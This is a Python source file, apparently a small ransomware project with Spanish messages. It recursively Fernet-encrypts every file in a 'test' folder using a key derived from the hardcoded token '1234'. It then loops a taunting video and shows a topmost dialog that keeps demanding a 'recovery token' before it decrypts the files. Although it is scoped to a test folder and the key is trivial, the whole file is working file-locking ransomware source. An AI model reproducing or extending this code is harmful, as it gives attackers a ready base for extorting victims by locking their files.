import os
import secrets
import base64
import pathlib
import subprocess
import tkinter as tk
from tkinter import simpledialog
import threading
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

def generate_salt(size=16):
    return secrets.token_bytes(size)

def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt():
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)
            
def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encriptando {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Token inválido, probablemente la contraseña sea incorrecta")
        return
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    
def decrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Desencriptando {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)

def reproducir_video(ruta_video):
    process = subprocess.Popen(['vlc', '--loop', ruta_video], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

def ejecutar_encriptador(token):
    key = generate_key(token, load_existing_salt=True)
    encrypt_folder("test", key)

def ejecutar_desencriptador(token):
    key = generate_key(token, load_existing_salt=True)
    decrypt_folder("test", key)  

if __name__ == "__main__":
    ruta_video = '/home/beto-dev/Documents/Projects/ransomware/ransom_resources/roles_are_inversed_haha.mp4'
    token = "1234"  

    hilo_encriptador = threading.Thread(target=ejecutar_encriptador, args=(token,))
    hilo_encriptador.start()

    video_process = reproducir_video(ruta_video)

    while True:
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        root.overrideredirect(True)

        password = simpledialog.askstring("Token de Recuperación", "Por favor, ingrese el token de recuperación:", parent=root, show='*')
        root.destroy()

        if password == token:
            break

    hilo_encriptador.join()

    video_process.terminate()

    hilo_desencriptador = threading.Thread(target=ejecutar_desencriptador, args=(token,))
    hilo_desencriptador.start()

    hilo_desencriptador.join()
